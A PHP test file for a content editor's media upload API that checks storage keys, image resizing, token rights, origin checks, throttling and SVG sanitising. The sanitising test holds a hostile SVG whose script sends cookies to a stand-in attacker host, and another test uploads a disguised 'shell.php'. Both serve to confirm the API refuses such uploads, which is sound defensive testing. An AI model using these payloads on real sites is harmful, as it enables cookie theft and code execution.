<?php

namespace ShipFast\LiveEdit\Tests\Api;

use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Storage;
use ShipFast\LiveEdit\Domain\Content\ImageStore;
use ShipFast\LiveEdit\Domain\Site\Ability;
use ShipFast\LiveEdit\Domain\Site\Site;
use ShipFast\LiveEdit\Domain\Site\TokenType;
use ShipFast\LiveEdit\Tests\Fixtures\RemoteLikeDisk;
use ShipFast\LiveEdit\Tests\TestCase;

class MediaTest extends TestCase
{
    protected Site $site;

    protected string $session;

    protected string $publishable;

    protected function defineEnvironment($app): void
    {
        parent::defineEnvironment($app);

        $app['config']->set('live-edit.api', [
            'enabled' => true,
            'prefix' => 'api/live-edit/v1',
            'session_ttl' => 1800,
            'throttle' => [
                'read' => ['burst' => ['max' => 120, 'seconds' => 60], 'sustained' => ['max' => 3000, 'seconds' => 3600]],
                'write' => ['burst' => ['max' => 40, 'seconds' => 60], 'sustained' => ['max' => 600, 'seconds' => 3600]],
                'session' => ['burst' => ['max' => 10, 'seconds' => 60], 'sustained' => ['max' => 120, 'seconds' => 3600]],
                'publish' => ['burst' => ['max' => 6, 'seconds' => 60], 'sustained' => ['max' => 60, 'seconds' => 3600]],
                'upload' => ['burst' => ['max' => 3, 'seconds' => 60], 'sustained' => ['max' => 10, 'seconds' => 3600]],
            ],
            'cache' => ['pointer_seconds' => 30, 'version_seconds' => 31536000, 'stale_while_revalidate' => 86400],
        ]);
        $app['config']->set('cors.paths', []);

        // The bucket, which is what a real deployment uses.
        $app['config']->set('live-edit.disk', 's3');
        $app['config']->set('live-edit.directory', 'live-edit');
        $app['config']->set('live-edit.max_upload_kb', 8192);
    }

    protected function setUp(): void
    {
        parent::setUp();

        Storage::fake('s3');

        // Answering path() with a key, as a bucket does. Without this the
        // fake is a local directory and the bug being guarded against here
        // cannot show itself.
        Storage::set('s3', new RemoteLikeDisk(Storage::disk('s3')));

        $this->site = Site::query()->create([
            'slug' => 'client',
            'name' => 'Client',
            'allowed_origins' => ['https://client.test'],
        ]);

        [, $this->session] = $this->site->issueToken(TokenType::Session, 'Edit', [Ability::Read, Ability::Write], now()->addHour());
        [, $this->publishable] = $this->site->issueToken(TokenType::Publishable, 'Web');
    }

    protected function url(): string
    {
        return '/api/live-edit/v1/client/media';
    }

    protected function as(string $token): array
    {
        return ['Authorization' => 'Bearer '.$token, 'Origin' => 'https://client.test'];
    }

    public function test_an_image_is_stored_on_the_bucket_and_answered_with_a_url(): void
    {
        $response = $this->post($this->url(), ['file' => UploadedFile::fake()->image('hero.jpg', 800, 600)], $this->as($this->session));

        $response->assertOk()->assertJsonStructure(['url', 'path']);

        $path = $response->json('path');
        Storage::disk('s3')->assertExists($path);
        $this->assertStringStartsWith('live-edit/', $path);

        // A URL is what a page fetches; a key is what the disk is asked for.
        // The stored value must be the key.
        $this->assertStringNotContainsString('http', $path);
    }

    public function test_an_image_is_fitted_before_it_reaches_the_bucket(): void
    {
        // The bug this guards: the fitter needs a real file, and on a remote
        // disk a stored path is a key. Fitting after storing silently did
        // nothing and the picture arrived at its original size.
        if (! extension_loaded('gd')) {
            $this->markTestSkipped('GD is not available.');
        }

        $response = $this->post($this->url(), [
            'file' => UploadedFile::fake()->image('wide.jpg', 1600, 400),
            'fitWidth' => 400,
            'fitHeight' => 400,
        ], $this->as($this->session));

        $response->assertOk();

        $stored = Storage::disk('s3')->get($response->json('path'));
        $size = getimagesizefromstring($stored);

        $this->assertSame([400, 400], [$size[0], $size[1]], 'the image reached the bucket unfitted');
    }

    public function test_a_publishable_key_cannot_upload(): void
    {
        $this->post($this->url(), ['file' => UploadedFile::fake()->image('x.jpg')], $this->as($this->publishable))
            ->assertStatus(403);

        $this->assertSame([], Storage::disk('s3')->allFiles());
    }

    public function test_an_upload_from_an_unlisted_origin_is_refused(): void
    {
        $this->post($this->url(), ['file' => UploadedFile::fake()->image('x.jpg')], [
            'Authorization' => 'Bearer '.$this->session,
            'Origin' => 'https://attacker.test',
        ])->assertStatus(403);

        $this->assertSame([], Storage::disk('s3')->allFiles());
    }

    public function test_a_disguised_file_is_refused(): void
    {
        // A .php that claims to be an image must not reach a bucket that may
        // be served by something willing to execute it.
        $this->post($this->url(), ['file' => UploadedFile::fake()->create('shell.php', 10, 'image/jpeg')], $this->as($this->session))
            ->assertStatus(422);

        $this->assertSame([], Storage::disk('s3')->allFiles());
    }

    public function test_an_oversized_image_is_refused(): void
    {
        config()->set('live-edit.max_upload_kb', 100);

        $this->post($this->url(), ['file' => UploadedFile::fake()->create('huge.jpg', 500, 'image/jpeg')], $this->as($this->session))
            ->assertStatus(422);

        $this->assertSame([], Storage::disk('s3')->allFiles());
    }

    public function test_an_svg_is_rebuilt_before_it_is_stored(): void
    {
        // An SVG is a document, not a picture. Served straight from a CDN it
        // is never passed through anything again, so it has to be safe as it
        // goes in.
        $hostile = <<<'SVG'
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10">
            <script>fetch('https://attacker.test/'+document.cookie)</script>
            <circle cx="5" cy="5" r="4" onload="alert(1)"/>
            <image href="https://attacker.test/pixel.png"/>
        </svg>
        SVG;

        $response = $this->post($this->url(), [
            'file' => UploadedFile::fake()->createWithContent('logo.svg', $hostile),
        ], $this->as($this->session));

        $response->assertOk();

        $stored = Storage::disk('s3')->get($response->json('path'));

        $this->assertStringNotContainsString('<script', $stored);
        $this->assertStringNotContainsString('onload', $stored);
        $this->assertStringNotContainsString('attacker.test', $stored);
        $this->assertStringContainsString('circle', $stored, 'the drawing itself should survive');
        $this->assertStringContainsString('viewBox', $stored, 'and so should its case-sensitive attributes');
    }

    public function test_uploads_are_throttled_harder_than_text(): void
    {
        for ($i = 0; $i < 3; $i++) {
            $this->post($this->url(), ['file' => UploadedFile::fake()->image("a{$i}.jpg")], $this->as($this->session))->assertOk();
        }

        $this->post($this->url(), ['file' => UploadedFile::fake()->image('b.jpg')], $this->as($this->session))
            ->assertStatus(429);
    }

    public function test_images_are_addressed_through_the_cdn_when_one_is_configured(): void
    {
        // The reason for the bucket: served from an edge near the visitor,
        // never from this application.
        config()->set('live-edit.media_url', 'https://cdn.client.test');

        $response = $this->post($this->url(), ['file' => UploadedFile::fake()->image('hero.jpg')], $this->as($this->session));

        $this->assertSame(
            'https://cdn.client.test/'.$response->json('path'),
            $response->json('url')
        );
    }

    public function test_the_stored_path_is_never_the_cdn_url(): void
    {
        // The trap: a URL stored where a key belongs works until the first
        // caller that needs a key.
        config()->set('live-edit.media_url', 'https://cdn.client.test');

        $path = (new ImageStore)->store(UploadedFile::fake()->image('hero.jpg'));

        $this->assertStringNotContainsString('cdn.client.test', $path);
        Storage::disk('s3')->assertExists($path);
    }

    public function test_the_editor_and_the_api_store_images_the_same_way(): void
    {
        // One store, so a picture uploaded in the page and one uploaded over
        // HTTP cannot end up in different places or at different sizes.
        $path = (new ImageStore)->store(UploadedFile::fake()->image('direct.jpg', 100, 100));

        Storage::disk('s3')->assertExists($path);
        $this->assertStringStartsWith('live-edit/', $path);
    }
}
